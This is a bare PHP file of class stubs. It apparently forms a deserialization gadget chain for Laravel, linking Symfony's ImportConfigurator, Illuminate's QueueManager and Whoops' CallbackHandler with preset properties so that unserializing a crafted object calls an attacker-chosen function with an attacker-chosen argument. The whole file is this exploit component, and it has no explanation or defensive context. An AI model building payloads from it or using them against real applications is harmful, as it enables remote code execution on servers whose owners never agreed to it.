<?php
namespace Whoops\Handler {
	abstract class Handler
	{
		private $run;
		private $inspector;
		private $exception;
		
		public function set($param)
		{
			$this->run = null;
			$this->inspector = null;
			$this->exception = $param;
		}
	}
	
	class CallbackHandler extends Handler
	{
		protected $callable;
		
		public function __construct($func, $param)
		{
			parent::set($param);
			$this->callable = $func;
		}
	}
}

namespace Illuminate\Queue {
	class QueueManager
	{
		protected $app;
		protected $connectors;
		
		public function __construct($func, $param) {
			$this->app = [
				'config'=>[
					'queue.default'=>'aaa',
					'queue.connections.aaa'=>[
						'driver'=>'bbb'
					],
				]
			];
			
			$file = new \Whoops\Handler\CallbackHandler($func, $param);
			$this->connectors = [
				'bbb'=>[
					$file, "handle"
				]
			];
		}
	}
}

namespace Symfony\Component\Routing\Loader\Configurator {
	class ImportConfigurator
	{
		private $parent;
		private $route;

		public function __construct($func, $param)
		{
			$this->parent = new \Illuminate\Queue\QueueManager($func, $param);
			$this->route = null;
		}
	}
}
